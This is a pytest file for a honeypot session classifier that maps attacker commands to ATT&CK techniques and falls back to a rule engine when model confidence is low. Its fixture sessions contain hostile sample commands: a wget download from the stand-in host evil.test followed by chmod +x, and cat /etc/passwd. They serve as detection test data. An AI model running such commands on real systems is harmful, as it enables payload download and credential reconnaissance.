import json

import numpy as np
import pandas as pd

import ml_classifier
from feature_extractor import build_feature_matrix


class StubModel:
    """Fake trained model: predict_proba returns whatever the test wants,
    without needing a real (slow, nondeterministic-ish) sklearn fit."""

    def __init__(self, probs):
        self._probs = np.asarray(probs)

    def predict_proba(self, X):
        return self._probs


class RaisingModel:
    def predict_proba(self, X):
        raise RuntimeError("model backend unavailable")


def _make_sessions_df() -> pd.DataFrame:
    return pd.DataFrame([
        {
            "session_id": "s1",
            "command_sequence": json.dumps(["wget http://evil.test/x", "chmod +x x"]),
            "urls_downloaded": json.dumps([]),
            "file_hashes": json.dumps([]),
            "login_attempts": 1,
            "login_success": True,
            "session_duration": 10.0,
        },
        {
            "session_id": "s2",
            "command_sequence": json.dumps(["cat /etc/passwd"]),
            "urls_downloaded": json.dumps([]),
            "file_hashes": json.dumps([]),
            "login_attempts": 5,
            "login_success": False,
            "session_duration": 5.0,
        },
    ])


def _fake_artifacts(df: pd.DataFrame, probs):
    features, vectorizer = build_feature_matrix(df, max_features=50)
    feature_columns = [c for c in features.columns if c != "session_id"]
    return {
        "model": StubModel(probs),
        "vectorizer": vectorizer,
        "feature_meta": {"feature_columns": feature_columns, "mlb_classes": ["T1105", "T1110"]},
    }


def test_high_confidence_prediction_uses_ml(tmp_path, monkeypatch):
    df = _make_sessions_df()
    # s1: confidently T1105; s2: confidently T1110. Confidence is the max
    # probability across *all* classes for that session, so a session needs
    # a high probability on some class (not just "high enough for its true
    # label") to clear the threshold and skip the rule-engine fallback.
    artifacts = _fake_artifacts(df, probs=[[0.95, 0.10], [0.05, 0.85]])
    monkeypatch.setattr(ml_classifier, "load_artifacts", lambda model_dir: artifacts)

    result = ml_classifier.predict_with_fallback(df, tmp_path, threshold=0.70).set_index("session_id")

    assert result.loc["s1", "source"] == "ml"
    assert "T1105" in json.loads(result.loc["s1", "predicted_techniques"])
    assert result.loc["s2", "source"] == "ml"
    assert json.loads(result.loc["s2", "predicted_techniques"]) == ["T1110"]


def test_low_confidence_falls_back_to_rule_engine(tmp_path, monkeypatch):
    df = _make_sessions_df()
    # Both sessions below the 0.70 threshold -> both should fall back.
    artifacts = _fake_artifacts(df, probs=[[0.55, 0.40], [0.30, 0.45]])
    monkeypatch.setattr(ml_classifier, "load_artifacts", lambda model_dir: artifacts)

    result = ml_classifier.predict_with_fallback(df, tmp_path, threshold=0.70).set_index("session_id")

    assert result.loc["s1", "source"] == "rule_fallback"
    assert result.loc["s2", "source"] == "rule_fallback"
    # s1's commands (wget + chmod +x) are handled by the deterministic rule engine.
    s1_techniques = json.loads(result.loc["s1", "predicted_techniques"])
    assert "T1105" in s1_techniques
    assert "T1222" in s1_techniques
    # s2 has 5 login attempts (>= brute-force threshold) and reads /etc/passwd.
    s2_techniques = json.loads(result.loc["s2", "predicted_techniques"])
    assert "T1110" in s2_techniques
    assert "T1087" in s2_techniques


def test_mixed_confidence_falls_back_per_session_not_globally(tmp_path, monkeypatch):
    df = _make_sessions_df()
    artifacts = _fake_artifacts(df, probs=[[0.95, 0.05], [0.20, 0.10]])
    monkeypatch.setattr(ml_classifier, "load_artifacts", lambda model_dir: artifacts)

    result = ml_classifier.predict_with_fallback(df, tmp_path, threshold=0.70).set_index("session_id")

    assert result.loc["s1", "source"] == "ml"
    assert result.loc["s2", "source"] == "rule_fallback"


def test_model_exception_falls_back_to_rule_engine_for_all_sessions(tmp_path, monkeypatch):
    df = _make_sessions_df()
    features, vectorizer = build_feature_matrix(df, max_features=50)
    feature_columns = [c for c in features.columns if c != "session_id"]
    artifacts = {
        "model": RaisingModel(),
        "vectorizer": vectorizer,
        "feature_meta": {"feature_columns": feature_columns, "mlb_classes": ["T1105", "T1110"]},
    }
    monkeypatch.setattr(ml_classifier, "load_artifacts", lambda model_dir: artifacts)

    result = ml_classifier.predict_with_fallback(df, tmp_path, threshold=0.70).set_index("session_id")

    assert (result["source"] == "rule_fallback").all()


def test_missing_artifacts_raises_clear_error(tmp_path):
    assert ml_classifier.artifacts_available(tmp_path) is False
    try:
        ml_classifier.load_artifacts(tmp_path)
        assert False, "expected ModelArtifactsMissing"
    except ml_classifier.ModelArtifactsMissing as exc:
        assert "train_pipeline.py" in str(exc)
